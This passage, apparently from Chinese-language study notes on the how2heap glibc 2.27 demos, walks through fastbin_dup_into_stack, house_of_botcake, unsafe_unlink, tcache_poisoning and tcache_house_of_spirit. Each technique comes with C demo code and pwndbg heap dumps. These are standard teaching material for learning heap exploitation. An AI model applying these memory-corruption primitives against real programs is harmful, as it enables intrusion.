	c &#x3D; calloc(1, 8);

	assert(a &#x3D;&#x3D; c);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>填满<code>tcache</code>之后正常利用<code>double free</code></p>
<p>先创建7个堆并释放以填满<code>tcache</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
0x20 [  7]: 0x405360 —▸ 0x405340 —▸ 0x405320 —▸ 0x405300 —▸ 0x4052e0 —▸ 0x4052c0 —▸ 0x4052a0 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>创建三个堆，先释放前两个堆，再释放第一个堆，造成<code>double free</code>，<code>bin</code>中由第一个堆指向第二个堆再指向第一个堆</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
0x20 [  7]: 0x405360 —▸ 0x405340 —▸ 0x405320 —▸ 0x405300 —▸ 0x4052e0 —▸ 0x4052c0 —▸ 0x4052a0 ◂— 0x0
fastbins
0x20: 0x405390 —▸ 0x4053b0 ◂— 0x405390
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>此时创建三个堆，第一三个堆为同一个堆</p>
<h3 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;assert.h&gt;

int main()
&#123;
	void *ptrs[7];

	for (int i&#x3D;0; i&lt;7; i++) &#123;
		ptrs[i] &#x3D; malloc(8);
	&#125;
	for (int i&#x3D;0; i&lt;7; i++) &#123;
		free(ptrs[i]);
	&#125;


	unsigned long long stack_var;

	int *a &#x3D; calloc(1,8);
	int *b &#x3D; calloc(1,8);
	int *c &#x3D; calloc(1,8);

	free(a);

	free(b);

	free(a);

	unsigned long long *d &#x3D; calloc(1,8);

	stack_var &#x3D; 0x20;

	*d &#x3D; (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));
	
	void *p &#x3D; calloc(1,8);

	assert(p &#x3D;&#x3D; 8+(char *)&amp;stack_var);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>利用<code>fastbin_dup</code>即<code>double free</code>，申请出第一个堆之后将<code>fd</code>位置改成栈上的地址，于是栈上地址就会出现在<code>bin</code>链中，就能被申请出来了</p>
<h3 id="fastbin-reverse-into-tcache"><a href="#fastbin-reverse-into-tcache" class="headerlink" title="fastbin_reverse_into_tcache"></a>fastbin_reverse_into_tcache</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;assert.h&gt;

const size_t allocsize &#x3D; 0x40;

int main()&#123;
  setbuf(stdout, NULL);

  char* ptrs[14];
  size_t i;
  for (i &#x3D; 0; i &lt; 14; i++) &#123;
    ptrs[i] &#x3D; malloc(allocsize);
  &#125;

  for (i &#x3D; 0; i &lt; 7; i++) &#123;
    free(ptrs[i]);
  &#125;

  char* victim &#x3D; ptrs[7];
 
  free(victim);

  for (i &#x3D; 8; i &lt; 14; i++) &#123;
    free(ptrs[i]);
  &#125;

  size_t stack_var[6];
  memset(stack_var, 0xcd, sizeof(stack_var));

  *(size_t**)victim &#x3D; &amp;stack_var[0];

  for (i &#x3D; 0; i &lt; 7; i++) &#123;
    ptrs[i] &#x3D; malloc(allocsize);
  &#125;


  for (i &#x3D; 0; i &lt; 6; i++) &#123;
    printf(&quot;%p: %p\n&quot;, &amp;stack_var[i], (char*)stack_var[i]);
  &#125;

  malloc(allocsize);

  for (i &#x3D; 0; i &lt; 6; i++) &#123;
    printf(&quot;%p: %p\n&quot;, &amp;stack_var[i], (char*)stack_var[i]);
  &#125;

  char *q &#x3D; malloc(allocsize);

  assert(q &#x3D;&#x3D; (char *)&amp;stack_var[2]);

  return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>填满<code>tcache</code>之后填入<code>fastbin</code>并改<code>fd</code>为目的地址，再从<code>tcache</code>申请堆之后<code>fastbin</code>中的堆会落到<code>tcache</code>，顺延申请到目的地址</p>
<p>创建了<code>14</code>个堆之后全部释放</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
0x50 [  7]: 0x405440 —▸ 0x4053f0 —▸ 0x4053a0 —▸ 0x405350 —▸ 0x405300 —▸ 0x4052b0 —▸ 0x405260 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x405660 —▸ 0x405610 —▸ 0x4055c0 —▸ 0x405570 —▸ 0x405520 ◂— ...
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将<code>fastbin</code>中第一个堆的<code>fd</code>改成目标地址</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x251

Free chunk (tcache) | PREV_INUSE
Addr: 0x405250
Size: 0x51
fd: 0x00

Free chunk (tcache) | PREV_INUSE
Addr: 0x4052a0
Size: 0x51
fd: 0x405260

Free chunk (tcache) | PREV_INUSE
Addr: 0x4052f0
Size: 0x51
fd: 0x4052b0

Free chunk (tcache) | PREV_INUSE
Addr: 0x405340
Size: 0x51
fd: 0x405300

Free chunk (tcache) | PREV_INUSE
Addr: 0x405390
Size: 0x51
fd: 0x405350

Free chunk (tcache) | PREV_INUSE
Addr: 0x4053e0
Size: 0x51
fd: 0x4053a0

Free chunk (tcache) | PREV_INUSE
Addr: 0x405430
Size: 0x51
fd: 0x4053f0

Free chunk (fastbins) | PREV_INUSE
Addr: 0x405480
Size: 0x51
fd: 0x7fffffffdc60							&lt;-- target

...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将<code>tachce</code>全部申请完再申请一次之后目的地址会出现在<code>tcache</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
0x50 [  7]: 0x7fffffffdc70 —▸ 0x405490 —▸ 0x4054e0 —▸ 0x405530 —▸ 0x405580 —▸ 0x4055d0 —▸ 0x405620 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0xcdcdcdcdcdcdcdcd
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="house-of-botcake-double-free"><a href="#house-of-botcake-double-free" class="headerlink" title="house_of_botcake(double free)"></a>house_of_botcake(double free)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdint.h&gt;
#include &lt;assert.h&gt;


int main()
&#123;
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    intptr_t stack_var[4];
    intptr_t *x[7];
    for(int i&#x3D;0; i&lt;sizeof(x)&#x2F;sizeof(intptr_t*); i++)&#123;
        x[i] &#x3D; malloc(0x100);
    &#125;
    
    intptr_t *prev &#x3D; malloc(0x100);
    intptr_t *a &#x3D; malloc(0x100);
    malloc(0x10);
    
    for(int i&#x3D;0; i&lt;7; i++)&#123;
        free(x[i]);
    &#125;
    free(a);
    free(prev);
    
    malloc(0x100);
    free(a);
    
    intptr_t *b &#x3D; malloc(0x120);
    b[0x120&#x2F;8-2] &#x3D; (long)stack_var;
    
    malloc(0x100);
    intptr_t *c &#x3D; malloc(0x100);
    
    assert(c&#x3D;&#x3D;stack_var);
    return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>利用<code>double free</code>使得同一个堆同时出现在<code>tcache</code>和<code>unsorted bin</code>造成堆块重叠</p>
<p>创建7个堆填满<code>tcache</code>，两个堆用于填入<code>unsorted bin</code>，最后一个堆防止和<code>top chunk</code>合并</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x405250
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x405360
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x405470
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x405580
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x405690
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x4057a0
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x4058b0
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x4059c0
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x405ad0
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x405be0
Size: 0x21

Top chunk | PREV_INUSE
Addr: 0x405c00
Size: 0x20401<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将所有堆释放以进入对应的<code>bin</code>，其中<code>unsorted bin</code>中的两个堆合并</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
0x110 [  7]: 0x4058c0 —▸ 0x4057b0 —▸ 0x4056a0 —▸ 0x405590 —▸ 0x405480 —▸ 0x405370 —▸ 0x405260 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x4059c0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x4059c0
smallbins
empty
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>创建一个堆让<code>tcache</code>有一个空位</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
0x110 [  6]: 0x4057b0 —▸ 0x4056a0 —▸ 0x405590 —▸ 0x405480 —▸ 0x405370 —▸ 0x405260 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x4059c0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x4059c0
smallbins
empty
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>再次释放<code>unsorted bin</code>的第一个堆使其进入<code>tcache</code>，此时<code>tcache</code>和<code>unsorted bin</code>的第一个堆是同一个堆，造成了堆块重叠</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
0x110 [  7]: 0x405ae0 —▸ 0x4057b0 —▸ 0x4056a0 —▸ 0x405590 —▸ 0x405480 —▸ 0x405370 —▸ 0x405260 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x4059c0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x4059c0
smallbins
empty
largebins
empty
pwndbg&gt; x&#x2F;20gx 0x405ad0
0x405ad0:       0x0000000000000000      0x0000000000000111
0x405ae0:       0x00000000004057b0      0x00007ffff7dcfca0
0x405af0:       0x0000000000000000      0x0000000000000000
0x405b00:       0x0000000000000000      0x0000000000000000
0x405b10:       0x0000000000000000      0x0000000000000000
0x405b20:       0x0000000000000000      0x0000000000000000
0x405b30:       0x0000000000000000      0x0000000000000000
0x405b40:       0x0000000000000000      0x0000000000000000
0x405b50:       0x0000000000000000      0x0000000000000000
0x405b60:       0x0000000000000000      0x0000000000000000
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>创建一个比释放的堆大一点的堆，这个堆会从<code>unsorted bin</code>中切割，且和<code>tcache</code>中第一个地址相同</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x251

Free chunk (tcache) | PREV_INUSE
Addr: 0x405250
Size: 0x111
fd: 0x00

Free chunk (tcache) | PREV_INUSE
Addr: 0x405360
Size: 0x111
fd: 0x405260

Free chunk (tcache) | PREV_INUSE
Addr: 0x405470
Size: 0x111
fd: 0x405370

Free chunk (tcache) | PREV_INUSE
Addr: 0x405580
Size: 0x111
fd: 0x405480

Free chunk (tcache) | PREV_INUSE
Addr: 0x405690
Size: 0x111
fd: 0x405590

Free chunk (tcache) | PREV_INUSE
Addr: 0x4057a0
Size: 0x111
fd: 0x4056a0

Allocated chunk | PREV_INUSE
Addr: 0x4058b0
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x4059c0
Size: 0x131

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x405af0
Size: 0xf1
fd: 0x7ffff7dcfca0
bk: 0x7ffff7dcfca0

Allocated chunk
Addr: 0x405be0
Size: 0x20

Top chunk | PREV_INUSE
Addr: 0x405c00
Size: 0x20401<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>修改刚创建的堆的<code>fd</code>位置，此时<code>tcache</code>中的堆会被修改，实现任意地址写</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
0x110 [  7]: 0x405ae0 —▸ 0x7fffffffdcf0 —▸ 0x7fffffffdd58 —▸ 0x7fffffffde28 —▸ 0x7fffffffe1c1 ◂— &#39;&#x2F;home&#x2F;starrysky&#x2F;how2heap&#x2F;how2heap&#x2F;glibc_2.27&#x2F;house_of_botcake&#39;
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x405af0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x405af0
smallbins
empty
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="unsafe-unlink-unlink"><a href="#unsafe-unlink-unlink" class="headerlink" title="unsafe_unlink(unlink)"></a>unsafe_unlink(unlink)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;assert.h&gt;

uint64_t *chunk0_ptr;

int main()
&#123;
	setbuf(stdout, NULL);
	
	int malloc_size &#x3D; 0x420;
	int header_size &#x3D; 2;

	chunk0_ptr &#x3D; (uint64_t*) malloc(malloc_size);
	uint64_t *chunk1_ptr  &#x3D; (uint64_t*) malloc(malloc_size); 
	
	chunk0_ptr[2] &#x3D; (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*3);
	chunk0_ptr[3] &#x3D; (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*2);
	
	uint64_t *chunk1_hdr &#x3D; chunk1_ptr - header_size;
	
	chunk1_hdr[0] &#x3D; malloc_size;
	chunk1_hdr[1] &amp;&#x3D; ~1;

	free(chunk1_ptr);

	char victim_string[8];
	strcpy(victim_string,&quot;Hello!~&quot;);
	chunk0_ptr[3] &#x3D; (uint64_t) victim_string;

	chunk0_ptr[0] &#x3D; 0x4141414142424242LL;

	assert(*(long *)victim_string &#x3D;&#x3D; 0x4141414142424242L);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>tcache</code>最大范围是<code>0x408</code>,超过这个范围的会被释放到<code>unsorted bin</code></p>
<p>创建属于<code>unsorted bin</code>的堆之后伪造一个堆绕过<code>unlink</code>的检查</p>
<p><code>unlink</code>相关检查</p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;* Take a chunk off a bin list *&#x2F;
#define unlink(AV, P, BK, FD) &#123;                                           
    if (__builtin_expect (chunksize(P) !&#x3D; prev_size (next_chunk(P)), 0))      
      malloc_printerr (&quot;corrupted size vs. prev_size&quot;);                
    FD &#x3D; P-&gt;fd;                               
    BK &#x3D; P-&gt;bk;                               
    if (__builtin_expect (FD-&gt;bk !&#x3D; P || BK-&gt;fd !&#x3D; P, 0))           
      malloc_printerr (&quot;corrupted double-linked list&quot;);                
    else &#123;                            
        FD-&gt;bk &#x3D; BK;                           
        BK-&gt;fd &#x3D; FD;                           
        if (!in_smallbin_range (chunksize_nomask (P))              
            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize !&#x3D; NULL, 0)) &#123;          
       if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize !&#x3D; P, 0)       
      || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize !&#x3D; P, 0))    
         malloc_printerr (&quot;corrupted double-linked list (not small)&quot;);   
            if (FD-&gt;fd_nextsize &#x3D;&#x3D; NULL) &#123;                
                if (P-&gt;fd_nextsize &#x3D;&#x3D; P)                  
                  FD-&gt;fd_nextsize &#x3D; FD-&gt;bk_nextsize &#x3D; FD;           
                else &#123;                         
                    FD-&gt;fd_nextsize &#x3D; P-&gt;fd_nextsize;              
                    FD-&gt;bk_nextsize &#x3D; P-&gt;bk_nextsize;              
                    P-&gt;fd_nextsize-&gt;bk_nextsize &#x3D; FD;              
                    P-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; FD;              
                  &#125;                            
              &#125; else &#123;                         
                P-&gt;fd_nextsize-&gt;bk_nextsize &#x3D; P-&gt;bk_nextsize;           
                P-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; P-&gt;fd_nextsize;           
              &#125;                               
          &#125;                               
      &#125;                                  
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>伪造堆需要绕过：<code>FD-&gt;bk = BK; BK-&gt;fd = FD;</code></p>
<p>伪造完成后改地址相邻的下一个堆的的<code>prve_size</code>为伪造的堆大小、<code>inuse</code>位为<code>0</code>再释放掉它即可向后合并取消连接<code>fake chunk</code></p>
<p>先创建两个堆</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x405250
Size: 0x431

Allocated chunk | PREV_INUSE
Addr: 0x405680
Size: 0x431

Top chunk | PREV_INUSE
Addr: 0x405ab0
Size: 0x20551<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在第一个堆伪造一个堆的<code>fd、bk</code>并把第二个堆<code>inuse</code>位和<code>prve_size</code>位改掉</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x405250
Size: 0x431

Allocated chunk
Addr: 0x405680
Size: 0x430

Top chunk | PREV_INUSE
Addr: 0x405ab0
Size: 0x20551

pwndbg&gt; x&#x2F;20gx 0x405250
0x405250:	0x0000000000000000	0x0000000000000431
0x405260:	0x0000000000000000	0x0000000000000000
0x405270:	0x0000000000404050	0x0000000000404058
0x405280:	0x0000000000000000	0x0000000000000000
0x405290:	0x0000000000000000	0x0000000000000000
0x4052a0:	0x0000000000000000	0x0000000000000000
0x4052b0:	0x0000000000000000	0x0000000000000000
0x4052c0:	0x0000000000000000	0x0000000000000000
0x4052d0:	0x0000000000000000	0x0000000000000000
0x4052e0:	0x0000000000000000	0x0000000000000000
pwndbg&gt; x&#x2F;20gx 0x405680
0x405680:	0x0000000000000420	0x0000000000000430
0x405690:	0x0000000000000000	0x0000000000000000
0x4056a0:	0x0000000000000000	0x0000000000000000
0x4056b0:	0x0000000000000000	0x0000000000000000
0x4056c0:	0x0000000000000000	0x0000000000000000
0x4056d0:	0x0000000000000000	0x0000000000000000
0x4056e0:	0x0000000000000000	0x0000000000000000
0x4056f0:	0x0000000000000000	0x0000000000000000
0x405700:	0x0000000000000000	0x0000000000000000
0x405710:	0x0000000000000000	0x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>释放第二个堆即可通过第一个堆去改任意地址的内容</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x405250
Size: 0x431

Allocated chunk
Addr: 0x405680
Size: 0x430

Allocated chunk | PREV_INUSE
Addr: 0x405ab0
Size: 0x20551

pwndbg&gt; x&#x2F;20gx 0x405250
0x405250:	0x0000000000000000	0x0000000000000431
0x405260:	0x0000000000000000	0x0000000000020da1
0x405270:	0x0000000000404050	0x0000000000404058
0x405280:	0x0000000000000000	0x0000000000000000
0x405290:	0x0000000000000000	0x0000000000000000
0x4052a0:	0x0000000000000000	0x0000000000000000
0x4052b0:	0x0000000000000000	0x0000000000000000
0x4052c0:	0x0000000000000000	0x0000000000000000
0x4052d0:	0x0000000000000000	0x0000000000000000
0x4052e0:	0x0000000000000000	0x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdint.h&gt;
#include &lt;assert.h&gt;

int main()
&#123;
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	size_t stack_var;
	intptr_t *a &#x3D; malloc(128);
	intptr_t *b &#x3D; malloc(128);
    
	free(a);
	free(b);

	b[0] &#x3D; (intptr_t)&amp;stack_var;
	intptr_t *c &#x3D; malloc(128);

	assert((long)&amp;stack_var &#x3D;&#x3D; (long)c);
	return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>打<code>fd</code>实现任意地址读写</p>
<p>创建两个堆再释放掉，进入<code>tcache</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x251

Free chunk (tcache) | PREV_INUSE
Addr: 0x405250
Size: 0x91
fd: 0x00

Free chunk (tcache) | PREV_INUSE
Addr: 0x4052e0
Size: 0x91
fd: 0x405260

Top chunk | PREV_INUSE
Addr: 0x405370
Size: 0x20c91<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>改第二个堆的<code>fd</code>为目标地址之后再申请即可实现任意地址读写</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x405250
Size: 0x91

Free chunk (tcache) | PREV_INUSE
Addr: 0x4052e0
Size: 0x91
fd: 0x7fffffffdd70

Top chunk | PREV_INUSE
Addr: 0x405370
Size: 0x20c91<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;assert.h&gt;

int main()
&#123;
	setbuf(stdout, NULL);

	malloc(1);

	unsigned long long *a; 
	unsigned long long fake_chunks[10]; 
    
	fake_chunks[1] &#x3D; 0x40; 
	a &#x3D; &amp;fake_chunks[2];

	free(a);

	void *b &#x3D; malloc(0x30);

	assert((long)b &#x3D;&#x3D; (long)&amp;fake_chunks[2]);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在栈上伪造一个堆之后释放掉再申请即可申请到伪造的堆，<code>tcache</code>会判断取出堆之后的下标不能为负数，所以要先创建一个堆</p>
<p>先随便创建一个堆</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x405250
Size: 0x21

Top chunk | PREV_INUSE
Addr: 0x405270
